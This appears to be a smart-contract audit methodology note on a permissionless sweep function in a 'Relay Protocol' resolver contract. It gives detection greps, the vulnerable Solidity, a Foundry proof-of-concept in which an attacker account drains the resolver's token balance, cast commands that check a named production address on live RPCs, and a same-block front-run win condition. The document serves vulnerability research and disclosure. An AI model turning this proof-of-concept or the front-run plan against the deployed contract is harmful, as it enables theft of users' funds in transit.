# Unguarded value-sweeping entrypoints — and proving a contract is LIVE, not just deployed

Condensed from the round that produced the strongest finding of a multi-round Relay Protocol hunt:
a `call-resolver` contract deployed on production with **no caller check at all** on a function that
sweeps its entire token balance to a caller-chosen recipient.

This file is the counterpart to §15 of `evm-foundry-and-offchain-api-audit.md`. §15 is *"the
signature binds too little"*; this is *"there is no signature at all"*. Both are found by reading a
guard, not by fuzzing.

**Section list:** §1 the shape and why it hides · §2 the detection sweep (one grep family) · §3 the
four-rung reachability ladder · §4 the LIVE ladder — codesize → HUB() identity → selector probe →
value in transit · §5 the honest bounded verdict (balance 0 is not a refutation) · §6 subagent
blind-spot note.

---

## 1. THE SHAPE — and why reviewers miss it

```solidity
// BasicCallResolver.sol:75-79
function execute(
    ExecuteAndWithdrawRequest calldata,
    bool,
    bytes calldata data
) external nonReentrant {              // ← no onlyExecutor, no onlyRole, no msg.sender check

    (Call[] memory calls, Sweep[] memory sweeps) = abi.decode(data, (Call[], Sweep[]));

    for (uint256 i; i < calls.length; ++i) {
        (bool ok, bytes memory res) = calls[i].to.call(calls[i].data);   // arbitrary call
        if (!ok) revert CallFailed(i, calls[i].to, res);
    }

    for (uint256 i; i < sweeps.length; ++i) {
        uint256 balance = HUB.balanceOf(address(this), sweeps[i].tokenId);
        if (balance != 0) HUB.transfer(sweeps[i].recipient, sweeps[i].tokenId, balance);  // ← ALL of it
    }
}
```

Four properties stack into a critical, and each one alone looks innocuous:

| Property | Reads as | Actually is |
|---|---|---|
| `external` with only `nonReentrant` | "it's protected" | reentrancy guard is not an authorization guard |
| name `execute` + request struct param | "caller is the executor" | parameter is unused by this impl |
| docstring "typically the RelayExecutor" | an assurance | a *convention*, explicitly not enforcement |
| sweeps `balanceOf(address(this))` | "cleans up dust" | sweeps the **entire** balance, recipient caller-chosen |

And `calls[].to.call(calls[].data)` makes it an **arbitrary external call primitive** with the
resolver as `msg.sender` — worth reporting separately, because it lets an attacker make the resolver
call `approve`, `setOwner`, or any other target that trusts the resolver's address.

**Why it hides:** `_runCalls` in the parent (`RelayExecutor.sol:276-288`) *funds the resolver first
and then calls it*. Every reviewer reading the executor sees `callResolver.execute(...)` with the
executor as the implied caller and moves on. The bug is only visible from the resolver's own file,
where nothing constrains the caller.

---

## 2. THE DETECTION SWEEP — one grep family, run it on every resolver/keeper/payer

```bash
# (a) every external function that moves value out of itself
grep -rn "HUB.transfer\|\.safeTransfer(\|transferFrom(" --include=*.sol contracts/ \
  | grep -v "test\|mock"

# (b) every one that also reads its own balance
grep -rn "balanceOf(address(this)" --include=*.sol contracts/

# (c) the intersection = sweep candidates.  For each, read the FIRST 8 LINES of the signature
grep -n -B2 -A10 "function execute\|function sweep\|function withdraw\|function poke" <file>
```

The tell, in order of reliability:

1. `external`/`public` + **no modifier other than `nonReentrant`**.
2. The recipient/target comes from a **decoded calldata struct**, not from a stored value.
3. The amount is `balanceOf(address(this))`, not a parameter — full-balance moves have no
   attacker-side bound, so the max loss is the entire holding.
4. A docstring that explains who *typically* calls it. **"Typically" is the word to grep for.** It
   marks a convention where the author believes a check exists.

```bash
grep -rn "typically\|assumed to be called by\|is expected to be" --include=*.sol contracts/
```

Those phrases are honest admissions of a non-enforced invariant. Pair each one with the function
below it and check for a real modifier.

---

## 3. THE FOUR-RUNG REACHABILITY LADDER

Do not stop at "it's unguarded" — enumerate what it can reach, in forge, one test each:

```
Rung A  permissionless sweep with empty calls + one sweep   -> value moves?      [PASS = finding]
Rung B  three unrelated EOAs all succeed                    -> no caller constraint of any kind
Rung C  calls[] redirects an arbitrary target's state       -> arbitrary call primitive
Rung D  preconditions: what must be true for real value
```

```solidity
// Rung A — the whole finding in 12 lines
BasicCallResolver.Sweep[] memory sweeps = new BasicCallResolver.Sweep[](1);
sweeps[0] = BasicCallResolver.Sweep({tokenId: TOKEN_IN, recipient: attacker});
bytes memory data = abi.encode(new BasicCallResolver.Call[](0), sweeps);

vm.prank(attacker);                                  // plain EOA, zero role, zero allowance
resolver.execute(req, false, data);
assertEq(hub.balanceOf(address(resolver), TOKEN_IN), 0);
assertEq(hub.balanceOf(attacker, TOKEN_IN), 500 ether);
```

```
[PASS] test_R8_a_permissionlessSweepDrainsResolver()
  resolver Hub balance before: 500000000000000000000
  resolver Hub balance after : 0
  attacker Hub balance       : 500000000000000000000
```

Rung C matters independently: the docstring says *"the resolver does not inherit the executor's Hub
operator role"* — true, and irrelevant, because the arbitrary call executes **as the resolver**, and
any third-party contract that granted the resolver anything (ERC20 approvals, ownership, operator
rights) is now reachable by anyone.

---

## 4. THE LIVE LADDER — four cheap calls that separate "deployed" from "exploitable today"

A forge-proven bug on a contract you never confirmed is on the audited chain is worth nothing (§15c
of the sibling file). The full ladder, in order:

```bash
C=0xb24ac15b9da6d88e283ffe048befe02e188ea64e        # address from deployments/contracts/prod.json
R=https://rpc.chain.relay.link

# 1. is it a contract on THIS chain?
cast codesize --rpc-url $R $C            # 0 = dead/undeployed; 1925 = live

# 2. does it point at the production Hub?  (the identity check nobody runs)
cast call --rpc-url $R $C "HUB()(address)"     # 0xDDD3…9318
grep -o '"hub": "[^"]*"' deployments/contracts/prod.json    # 0xddd3…9318   -> MATCH

# 3. is the source I read the bytecode that is live?
forge inspect BasicCallResolver methods            # execute(...) -> 05670896 ; HUB() -> a4c52b86
CODE=$(cast code --rpc-url $R $C); echo "$CODE" | grep -qi "05670896" && echo "execute PRESENT"

# 4. does the protocol actually hold value?
cast call --rpc-url $R $HUB "totalSupply(uint256)(uint256)" $TOKEN_ID   # 12926622906 -> active
```

Step 2 is the one that turns a code read into a **live** claim, and it is almost always skipped. A
contract whose `HUB()`/`EXECUTOR()`/`owner()` getter resolves to the production core contract is
deployed *and wired in* — that is a materially stronger statement than `codesize != 0`.

**Multi-chain gotcha that cost a wasted round:** `deployments/contracts/prod.json` is a *per-chain*
manifest in a 59-chain protocol, and `cast codesize` on `ethereum.publicnode.com` returned **0** for a
contract that is live on chain 537713. Probe every RPC you have and report the pair `(chain, codesize)`:

```bash
for R in https://rpc.chain.relay.link https://mainnet.base.org https://ethereum.publicnode.com; do
  echo -n "$R (chain $(cast chain-id --rpc-url $R 2>/dev/null)): "
  cast codesize --rpc-url $R $C
done
```

---

## 5. THE HONEST BOUNDED VERDICT — a zero balance is NOT a refutation

After all four rungs passed, the live balance was still `0`:

```bash
cast call --rpc-url $R $HUB "balanceOf(address,uint256)(uint256)" $C $TOKEN_ID   # 0
cast balance --rpc-url $R $C                                                      # 0
# scan ~2.6M blocks back for Hub Transfer logs with receiver = resolver  -> 0 hits
```

That does **not** kill the finding, and it does **not** license "attacker steals funds". The correct
reconciliation, which is what makes the report credible:

> "**HIGH confidence the auth gap is live in bytecode** (forge 3/3, `codesize` 1925, `HUB()` matches
> prod, both selectors present). **Not yet demonstrated end-to-end.** The resolver's balance is 0 and
> no inbound Hub `Transfer` was found scanning ~2.6M blocks, so funds are *transient per order*, not
> parked. Win condition = race the executor inside one order: call `execute()` after `_runCalls`
> funds the resolver but before the legitimate `execute()` — a same-block front-run. **UNPROVEN at
> execution level.**"

Then name the mitigation and stop. Three rules that keep this honest:

1. **`balance == 0` changes the *execution* status, never the *vulnerability* status.** Label them
   separately: `PROVEN (code) / LIVE (deployment) / UNPROVEN (execution)`.
2. **Never upgrade "transient" to "stealable" without a fork test.** A front-run race is a real but
   *unraced* claim; write it as `WIN CONDITION:` not as impact.
3. **Do report it.** An unauthenticated value-sweeping entrypoint on a deployed, wired-in contract is
   a valid finding at High even before you race it — the fix is three lines and the blast radius
   depends only on a balance that any user action can create.

Mitigation sentence to ship:

```solidity
require(msg.sender == address(HUB.executor()), "only executor");
// or an executor allowlist; never leave a full-balance sweep permissionless
```

---

## 6. SUBAGENT BLIND SPOT — four agents, three missed it

The batch was ARCHITECT / RED-TEAMER / FUZZ / CHAINER over the same repo, 150-iteration budget each.
The RED-TEAMER returned **18/18 forge tests PASS** and concluded *"no exploit could be proven"* —
which was true for the four claims it was given. It never opened `BasicCallResolver.sol`, because it
was briefed on the executor/allocator/gas-payer surface.

The contract that mattered was surfaced by the **ARCHITECT**, in a summary line about a *different*
finding, and was absent from the original target list (see
`trust-graph-role-reachability-and-latent-findings.md` §1).

**Operational lesson:** an "audit these N contracts" brief produces a negative verdict that is
*scoped*, not global. When a subagent reports "no exploit found", read its **ruled-out list** and
diff it against the repo's full contract inventory — the gap between them is where the next round
lives:

```bash
grep -rln "^contract " --include=*.sol contracts/ | sed 's|.*/||' | sort > /tmp/all.txt
# compare against what the subagent's report actually cited
```

Cheap and decisive: any contract receiving **value** that appears in none of the reports is priority
one for the next round, regardless of how confident the batch looked.
